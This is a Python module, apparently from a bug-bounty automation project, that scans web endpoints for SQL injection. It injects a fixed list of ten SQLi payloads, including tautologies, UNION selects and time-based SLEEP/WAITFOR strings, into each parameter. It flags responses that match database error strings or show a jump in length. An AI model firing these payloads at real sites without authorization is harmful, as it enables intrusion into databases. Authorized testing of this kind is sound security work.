"""BugBounty Bot — SQLi 스캐너."""
import httpx
from core.models import Asset, Endpoint, Finding
from core.logger import get_logger

log = get_logger("scanner.sqli")

SQLI_PAYLOADS = [
    ("' OR '1'='1", "boolean-based"),
    ("' OR 1=1--", "comment-based"),
    ("1' AND '1'='1", "tautology"),
    ("1 AND 1=1", "numeric tautology"),
    ("1 AND 1=2", "numeric false"),
    ("' UNION SELECT NULL--", "union-based"),
    ("1 UNION SELECT NULL--", "numeric union"),
    ("'; WAITFOR DELAY '0:0:5'--", "time-based MSSQL"),
    ("1' AND SLEEP(5)--", "time-based MySQL"),
    ("' OR ''='", "string bypass"),
]

ERROR_PATTERNS = [
    "sql syntax",
    "sqlstate",
    "mysql_fetch",
    "pg_query",
    "sqlite3.OperationalError",
    "ORA-",
    "Unclosed quotation mark",
    "You have an error in your SQL syntax",
    "Warning: mysql_",
    "PostgreSQL:",
    "SQLite format error",
    "com.mysql.jdbc",
    "System.Data.SqlClient",
]


def scan_sqli(asset: Asset, endpoint: Endpoint, client: httpx.Client) -> list[Finding]:
    """SQLi 스캔: 각 파라미터에 payload 주입, 응답 비교."""
    findings = []
    if not endpoint.params:
        return findings

    # Baseline request
    base_url = endpoint.url or asset.base_url
    baseline = _request(client, base_url, endpoint.method, {})
    if baseline is None:
        return findings

    for param in endpoint.params:
        for payload, technique in SQLI_PAYLOADS:
            params = {param: payload}
            resp = _request(client, base_url, endpoint.method, params)
            if resp is None:
                continue

            # Check for SQL errors
            body = resp.text.lower()
            for pattern in ERROR_PATTERNS:
                if pattern.lower() in body:
                    finding = Finding(
                        asset_id=asset.id,
                        vuln_type="sqli",
                        severity="high",
                        endpoint=base_url,
                        method=endpoint.method,
                        evidence=f"SQL error detected: '{pattern}' in response (technique: {technique})",
                        poc_request={
                            "method": endpoint.method,
                            "url": base_url,
                            "params": params,
                        },
                        raw_data={"technique": technique, "status": resp.status_code},
                    )
                    findings.append(finding)
                    break

            # Check for boolean-based (response length difference)
            if len(resp.text) > len(baseline.text) * 1.5:
                finding = Finding(
                    asset_id=asset.id,
                    vuln_type="sqli",
                    severity="medium",
                    endpoint=base_url,
                    method=endpoint.method,
                    evidence=f"Response length anomaly: baseline={len(baseline.text)}, payload={len(resp.text)} (technique: {technique})",
                    poc_request={
                        "method": endpoint.method,
                        "url": base_url,
                        "params": params,
                    },
                    raw_data={"technique": technique, "status": resp.status_code},
                )
                findings.append(finding)

    log.info("sqli: %d findings on %s", len(findings), base_url)
    return findings


def _request(client: httpx.Client, url: str, method: str, params: dict) -> httpx.Response | None:
    try:
        if method.upper() == "GET":
            return client.get(url, params=params, timeout=10)
        elif method.upper() == "POST":
            return client.post(url, data=params, timeout=10)
        return client.get(url, params=params, timeout=10)
    except Exception as e:
        log.debug("request failed: %s %s: %s", method, url, e)
        return None
